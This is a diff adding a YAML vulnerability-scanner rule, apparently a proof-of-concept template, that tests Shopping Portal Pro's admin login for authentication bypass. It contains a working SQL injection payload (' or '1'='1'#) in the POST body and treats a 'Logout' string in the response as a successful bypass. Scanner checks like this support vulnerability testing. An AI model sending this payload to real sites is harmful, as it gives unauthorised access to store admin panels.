@@ -1,0 +1,14 @@
+name:ShoppingPortalPro-AuthenticationBypass.yml
+rules:
+  - method: POST
+    path: /shopping/admin/index.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'username=aaa'' or ''1''=''1''#&password=aaa'' or ''1''=''1''#&submit='
+    follow_redirects: true
+    expression: |
+      response.body.bcontains(Logout)
+detail:
+  author: su(https://suzzz112113.github.io/#blog)
+  links:
+    - https://www.exploit-db.com/exploits/47834
